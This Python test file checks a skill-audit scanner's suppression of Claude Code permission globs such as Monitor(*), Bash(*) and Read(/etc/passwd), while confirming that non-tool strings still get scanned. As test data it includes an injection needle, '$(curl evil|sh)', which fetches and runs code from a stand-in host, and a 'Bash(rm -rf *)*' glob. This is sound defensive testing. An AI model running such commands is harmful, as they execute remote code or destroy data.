#!/usr/bin/env python3
"""Two-sided tests for the skillaudit tool-glob SSOT (TRDD-ABFRMED0).

`_skillaudit_json_context._CLAUDE_CODE_TOOL_GLOB_RE` suppresses benign tool-
permission globs (strings at `permissions.{allow|ask|deny}[N]` that name a Claude
Code tool) so they are NOT scanned as REGEX_DOS / CMD_INJECTION content. Its tool-
name alternation is now DERIVED from the single source of truth
`cpv_tool_permission_match.CANONICAL_TOOLS | TOOL_ALIASES` instead of a hand-typed
list that had drifted stale (Monitor / PowerShell / ToolSearch / etc. were
omitted, so their permission globs weren't suppressed → rare false positives).

These tests prove: (1) the previously-omitted current tools are now suppressed,
(2) the previously-covered tools + the v2.1.x param/wildcard forms still are,
(3) a NON-tool string is NOT suppressed (the real security check still sees it),
(4) the suppressor only fires under a `permissions.*` path, and (5) the derived
alternation has full parity with CANONICAL_TOOLS.
"""

from __future__ import annotations

import sys
from pathlib import Path

scripts_dir = Path(__file__).parent.parent / "scripts"
if str(scripts_dir) not in sys.path:
    sys.path.insert(0, str(scripts_dir))

from _skillaudit_json_context import _is_claude_code_permission_glob  # noqa: E402
from cpv_tool_permission_match import CANONICAL_TOOLS, TOOL_ALIASES  # noqa: E402

_DENY = ("permissions", "deny", "[0]")


def test_previously_omitted_tools_now_suppressed() -> None:
    """Monitor / PowerShell globs (previously omitted from the regex) are now suppressed."""
    assert _is_claude_code_permission_glob(_DENY, "Monitor(*)") is True
    assert _is_claude_code_permission_glob(_DENY, "PowerShell(command:*)") is True
    assert _is_claude_code_permission_glob(_DENY, "ToolSearch(*)") is True


def test_previously_covered_tools_still_suppressed() -> None:
    """The tools that always matched (Bash/Read/Agent/WebFetch) still match."""
    for glob in ("Bash(*)", "Read(/etc/passwd)", "Agent(*)", "WebFetch(*)"):
        assert _is_claude_code_permission_glob(_DENY, glob) is True, glob


def test_param_and_wildcard_forms_suppressed() -> None:
    """The v2.1.x `param:value` / wildcard-domain / mid-pattern-wildcard forms match."""
    for glob in (
        "Agent(model:opus)",
        "WebFetch(domain:*.example.com)",
        "Read(secrets-*/config.json)",
        "Bash(rm -rf *)*",
    ):
        assert _is_claude_code_permission_glob(_DENY, glob) is True, glob


def test_non_tool_string_not_suppressed() -> None:
    """A non-tool string is NOT suppressed — the real security scan still sees it."""
    assert _is_claude_code_permission_glob(_DENY, "definitelynotatool(*)") is False
    # A genuine injection needle must never be suppressed as a 'tool glob'.
    assert _is_claude_code_permission_glob(_DENY, "$(curl evil|sh)") is False


def test_only_under_permissions_path() -> None:
    """A tool-shaped string OUTSIDE a permissions.* path is NOT suppressed."""
    assert _is_claude_code_permission_glob(("some", "other", "key"), "Bash(*)") is False
    assert _is_claude_code_permission_glob(("permissions", "allow", "[0]"), "Bash(*)") is True


def test_alternation_has_full_canonical_parity() -> None:
    """Every CANONICAL_TOOLS (+ alias) name is recognized by the derived regex."""
    for tool in set(CANONICAL_TOOLS) | set(TOOL_ALIASES):
        assert _is_claude_code_permission_glob(_DENY, f"{tool}(x)") is True, tool


if __name__ == "__main__":
    import pytest

    raise SystemExit(pytest.main([__file__, "-v"]))
